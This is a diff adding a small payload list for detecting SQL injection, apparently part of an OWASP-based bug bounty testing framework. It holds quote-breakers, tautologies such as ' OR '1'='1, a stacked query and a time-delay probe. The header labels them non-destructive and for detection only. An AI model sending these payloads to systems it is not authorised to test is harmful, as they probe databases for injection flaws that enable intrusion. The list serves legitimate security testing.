@@ -1,0 +1,25 @@
+# SQL Injection Detection Payloads
+# Error-triggering payloads only - no destructive queries
+# Framework: OWASP WSTG Bug Bounty Automation Framework
+# Author: scp2801
+
+'
+"
+''
+1'
+1"
+1`
+\\
+1\\
+'--
+"--
+' OR '1'='1
+" OR "1"="1
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+(SELECT 1)
+1;SELECT 1
+'||(SELECT 1)||'
+' WAITFOR DELAY '0:0:1'--
